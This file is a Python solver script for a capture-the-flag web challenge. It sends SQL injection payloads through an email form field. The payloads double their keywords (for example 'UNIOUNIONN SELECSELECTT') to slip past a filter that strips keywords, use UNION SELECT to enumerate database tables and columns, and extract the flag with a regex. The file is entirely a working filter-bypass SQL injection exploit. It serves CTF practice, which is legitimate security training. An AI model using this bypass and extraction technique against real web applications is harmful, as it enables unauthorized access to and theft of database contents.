import requests
import re

URL = 'http://no-time.challs.olicyber.it/'

# payload1 = 'c@gmail.com\' UNIOUNIONN SELECSELECTT table_name FROFROMM information_schema.tables WHERWHEREE table_schema = DATABASE() LIMILIMITT 10 OFFSEOFFSETT 1-- -'
# payload2 = 'f@gmail.com\' UNIOUNIONN SELECSELECTT column_name FROFROMM information_schema.columns WHERWHEREE table_name = \'qua_trovi_la_tua_flaflagg\'--'
payload = 'f@gmail.com\' UNIOUNIONN SELECSELECTT la_flaflagg_sta_qua FROFROMM qua_trovi_la_tua_flaflagg-- -'

r = requests.post(URL, data={'email':f'{payload}'})

flag = re.findall(r'flag\{.*?}', r.text)
if flag:
    print(flag[0])